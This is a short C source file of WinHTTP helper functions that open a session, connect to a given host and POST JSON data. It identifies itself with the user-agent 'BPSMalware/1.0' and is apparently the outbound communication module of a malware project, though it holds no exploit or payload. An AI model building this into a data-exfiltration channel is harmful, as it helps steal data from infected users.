#include "connection.h"
#include <winhttp.h>

HINTERNET InitSession() {
  HINTERNET hSession = WinHttpOpen( L"BPSMalware/1.0", WINHTTP_ACCESS_TYPE_NO_PROXY,
    WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

  if(!hSession)
    return NULL;

  return hSession;
}


HINTERNET Connect(HINTERNET hSession, char* hostname, int port) {
  int size = MultiByteToWideChar(CP_ACP, 0, hostname, -1, NULL, 0);
  const WCHAR* wideHostname = (WCHAR*) malloc(sizeof(WCHAR) * size);
  MultiByteToWideChar(CP_ACP, 0, hostname, -1, (LPWSTR)wideHostname, size);

  HINTERNET hConnect = WinHttpConnect(hSession, wideHostname, port, 0);
  if(!hConnect)
    return NULL;

  return hConnect;
}

int Send(HINTERNET hConnect,char* path, char* parameter, const char* data)
{
  BOOL bWrittenHead, bResult;
  int size = MultiByteToWideChar(CP_ACP, 0, path, -1, NULL, 0);
  const WCHAR* widePath = (WCHAR*) malloc(sizeof(WCHAR) * size);
  MultiByteToWideChar(CP_ACP, 0, path, -1, (LPWSTR)widePath, size);

  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
       widePath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

  if(!hRequest)
  {
    WinHttpCloseHandle(hRequest);
    return -1;
  }

  LPCWSTR headers = L"Content-Type: application/json";
  bWrittenHead = WinHttpAddRequestHeaders(hRequest, headers, wcslen(headers), WINHTTP_ADDREQ_FLAG_ADD);

  if(!bWrittenHead)
  {
    WinHttpCloseHandle(hRequest);
    return -1;
  }

  bResult = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)data, strlen(data), strlen(data), 0);
  if(!bResult)
  {
    WinHttpCloseHandle(hRequest);
    return -1;
  }

  WinHttpCloseHandle(hRequest);
  return 0;
}
